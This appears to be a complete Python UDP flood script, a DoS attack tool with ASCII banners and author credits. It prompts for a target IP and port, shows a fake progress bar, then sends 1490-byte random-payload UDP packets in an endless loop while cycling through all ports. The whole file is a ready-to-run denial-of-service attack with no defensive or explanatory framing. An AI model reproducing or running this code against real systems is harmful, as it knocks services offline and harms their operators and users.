
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("cls")
print('''
 ____  ____                 _   _   _             _    
|  _ \|  _ \  ___  ___     / \ | |_| |_ __ _  ___| | __
| | | | | | |/ _ \/ __|   / _ \| __| __/ _` |/ __| |/ /
| |_| | |_| | (_) \__ \  / ___ \ |_| || (_| | (__|   < 
|____/|____/ \___/|___/ /_/   \_\__|\__\__,_|\___|_|\_\
                                                       
''')
print ("Author   : HA-MRX")
print ("You Tube : https://www.youtube.com/c/HA-MRX")
print ("GitHub   : https://github.com/Ha3MrX")
print ("Facebook : https://www.facebook.com/muhamad.jabar222")
print ("\n")
ip = input("IP Target: ")
port = int(input("Port     : "))

os.system("cls")
print('''
    _   _   _             _      ____  _             _   _             
   / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
  / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
 / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
/_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
                                                                 |___/ 
''')
print ("[                    ] 0% ")
time.sleep(5)
print ("[=====               ] 25%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
sent = 0
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print ("Sent %s packet to %s throught port: %s."%(sent,ip,port))
    if port == 65534:
        port = 1